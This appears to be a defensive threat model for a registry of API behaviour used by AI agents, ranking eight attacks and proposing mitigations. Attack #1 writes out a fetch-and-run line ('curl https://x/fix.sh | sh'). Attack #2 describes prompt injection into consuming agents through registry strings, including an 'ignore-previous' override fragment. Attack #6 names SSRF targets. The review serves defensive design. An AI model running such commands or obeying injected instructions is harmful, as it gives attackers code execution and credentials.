Scores are my judgment (damage D, ease E, 1-5), not measured. Structural flaw behind most items: "CI" checks that a claim *reproduces*, not that it is *safe to act on*. The registry also feeds agents' decision loops, so one accepted write fans out.

## Attacks, ranked

### 1. Poisoned recipes laundered by "verified" (D5xE4)
- **Steps:** File a claim on a real, reproducible error. The request and assertion are benign and pass re-execution. The `fix` field says `curl https://x/fix.sh | sh`, a typosquatted package, or "rotate your key at <lookalike domain>". Ignore or out-wait disputes.
- **Gain:** code execution or credential theft in every agent that applies fixes. The badge is the lure.
- **Stopped by:** re-execution. **Fails:** it validates the assertion, not the fix. The stake is refundable and nothing triggers its loss.
- **Cheapest missing defense:** no free text or shell in `fix`. Fixes are typed actions from an enum (set header, back off N s, change param, pin version). Package or URL values must match the service's owner-verified domains or the official registry entry.

### 2. Prompt injection via registry text (D4xE5)
- **Steps:** Use any attacker-controlled string that reaches an LLM: claim text, evidence, endpoint templates (`/v1/{id}/ignore-previous...`), schema key paths (a hostile API returns keys that read as instructions, and fingerprints store key paths), service descriptions, markdown pages crawled by other agents. This also hits the registry's own ops agents.
- **Gain:** hijack consumers' tool calls via MCP, exfiltrate their context, plant persistent instructions in public pages.
- **Stopped by:** strict schema. **Fails:** it constrains shape, not content.
- **Cheapest missing defense:** a server-side charset allowlist and length cap for templates and keys (drop violators). Free text lives only in the anecdote tier, in a delimited data-only field, never in tool descriptions. MCP returns typed fields by default.

### 3. Privacy leakage via "metadata only" (D4xE4)
- **Steps:** Id normalization is a client-side heuristic and misses things:
  - secrets in paths (Telegram `/bot<TOKEN>/`, webhook URLs);
  - emails and slugs;
  - tenant subdomains (`acme.api.vendor.com`);
  - query strings and GraphQL operation names;
  - dynamic map keys (customer-defined custom fields reveal a tenant's schema);
  - rate-limit `remaining` counters, which reveal plan and usage and can be correlated.

  A scraper only has to read the public feed. Timing plus ASN plus key plus GitHub login gives traffic analysis of who uses what.
- **Gain:** live secrets, customer identifiers, competitor stack intel. The registry takes GDPR exposure for public, permanent data.
- **Stopped by:** the "never values" rule. **Fails:** it is a policy enforced by an untrusted client.
- **Cheapest missing defense:** server-side default-deny. Accept only paths matching a registered template of a registered service. Drop queries and dynamic keys. Bucket latency and time. Publish only aggregates with at least k reporters. Never publish reporter identity next to observations.

### 4. Sybil / quorum capture (D4xE4)
- **Steps:** Run three VMs on two clouds, or a residential proxy pool with thousands of ASNs, with fresh keys. For long-tail services the attacker *is* the whole reporter set. Sleeper variant: report honestly for weeks to farm reputation, then flip. Reputation defined as "agreement with consensus" also entrenches whoever reached consensus first. A GitHub login costs nothing.
- **Gain:** forged health, limit, or drift state; sabotage or promotion of a service; earned weight to spend on attacks 1-2.
- **Stopped by:** 3 reporters, 2 ASNs, reputation, anonymous cap. **Weak:** ASN diversity is cheap, reputation is farmable, and stakes apply to claims, not observations.
- **Cheapest missing defense:** observations never flip state alone. They trigger a registry probe, and the probe decides. Where probing is impossible, add independence tests (distinct operators, account age, distinct SDK builds) and cap weight per operator and per /16.

### 5. Fake drift to break competitors' agents (D3xE5)
- **Steps:** No forgery is needed. Real APIs emit polymorphic responses (optional fields, error shapes, last page, A/B flags, locale, plan). Send inputs that provoke the rare variant from three hosts. The fingerprints are honest, quorum passes, and "drift detected" appears on a rival's API. Auto-adapting or failing-over agents leave it, possibly for your service. You can also provoke real 429s to flip "health".
- **Stopped by:** quorum, disputes, owner namespace. **Fails:** the data is true but unrepresentative. Most owners never claim namespaces.
- **Cheapest missing defense:** key fingerprints by (endpoint, status, API version, request class). A new fingerprint is a "variant" and becomes "drift" only when it displaces the dominant one across at least N independent operators over time. Output carries prevalence, never a "switch" instruction.

### 6. Probes as DDoS / SSRF / recon (D4xE3)
- **Steps:** Claims and registrations name the target. Submit many claims, or trigger disputes (which cause re-execution), against a victim from several vantage points. This is free load attributed to the registry. Point recipes at `169.254.169.254`, internal hosts, or DNS-rebinding names. "Assertion passed" is a boolean oracle, and "evidence visible" publishes output. A recipe that carries the registry's test-account auth can ship its tokens to an attacker host. "Fetch and probe" registration is a free scanner.
- **Gain:** anonymous attack and recon, burned registry IPs, stolen test credentials.
- **Stopped by:** sandbox. **Fails:** egress policy, budgets, and credential scoping are unspecified.
- **Cheapest missing defense:** a declarative request DSL with no commands. Resolve and pin DNS and block private ranges. Probe only hosts whose control was proven (DNS TXT or `.well-known`) or that sit on a curated allowlist. Set per-target and global budgets, including on disputes. Inject credentials only for registered hostnames. Publish the assertion result, not raw responses. Use an honest User-Agent and an opt-out.

### 7. Legal / ToS exposure (D4xE3)
- **Steps:** Automated signups, multiple accounts, scraping clauses, paid calls, and CAPTCHAs breach vendor terms. An annoyed vendor sends a C&D or bans the vantage points. An attacker can frame the registry by submitting claims whose recipes hit destructive, paid, or undocumented endpoints. "Verified" vulnerability recipes (for example BOLA) add liability. A vendor claims its namespace and demands takedowns. Computer-misuse and GDPR exposure by jurisdiction is uncertain; get counsel.
- **Stopped by:** nothing stated except human appeals (1 h/week).
- **Cheapest missing defense:** at MVP, probe only public, unauthenticated GET/HEAD endpoints of services whose terms were reviewed (per-service `tos_reviewed` flag). No test-account signup. Publish a takedown contact with a fast response path. Accept no security-vulnerability claims.

### 8. Compromised popular SDK version (D5xE2)
- **Steps:** Take over a maintainer account or dependency, or typosquat, and ship a version that:
  - (a) emits forged observations from thousands of real hosts with real operator identities and aged keys, which are independent by every quorum criterion;
  - (b) as an in-path proxy, reads every API key and body.
- **Stopped by:** signed reporters, reputation. **Fails:** the keys are valid and reputation amplifies aged reporters.
- **Cheapest missing defense:** make the SDK a passive tracing hook that never sees credentials (no in-path proxy). Sign releases with provenance. Put the SDK build hash in every observation and require at least 2 distinct builds in a quorum. Add a per-version kill switch that retroactively quarantines all of that version's data, backed by an append-only log.

## (1) MVP minimum defenses, priority order
1. Typed-only output: no free text or shell in fixes, sanitized strings, the anecdote tier fenced and off by default in MCP. Ops agents read claims through the same typed path and hold no credentials beyond policy knobs. Covers #1 and #2.
2. Server-side default-deny ingestion: registered templates only, no queries, bucketed values, k-aggregation. Covers #3.
3. Probe policy: declarative DSL, SSRF and DNS pinning, verified or curated hosts, per-target budgets, scoped credentials, no raw output. Covers #6.
4. Observations are hints and probes are truth. State flips require a probe, with caps per operator, per /16, and per SDK build. Covers #4, #5, #8.
5. Legal posture: unauthenticated read-only access to about 50 curated services, no test accounts, opt-out, and takedown. Covers #7.
6. SDK hygiene, a per-version kill switch, and an append-only log with rollback. Covers #8.
7. Version-scoped fingerprints with prevalence. Covers #5.

Defer stakes, micropayments, private namespaces, and rich reputation.

## (2) Exclude from scope (not verifiable by execution)
- Per-account or plan-specific behavior, and anything behind a customer's auth.
- Side-effecting, paid, or non-idempotent endpoints (POST/DELETE, sends, charges).
- Security, compliance, pricing, ToS, or "trustworthy" claims, and subjective quality or rankings.
- Shell commands, package installs, or URLs outside owner-verified domains as fixes.
- Content of non-deterministic (LLM) endpoints. Schema and status only.
- Registry-owned test accounts on third-party services (defer).
- Private-network services.

## (3) Verdict
Not sound as written: executable recipes, test accounts, auto-verified fixes, and an in-path SDK are the dangerous parts. It is sound enough to start only as a narrow, read-only registry of public, unauthenticated GET endpoints with typed outputs and probe-confirmed state. Attacks 1-3 and the legal posture must be closed before anything goes public.
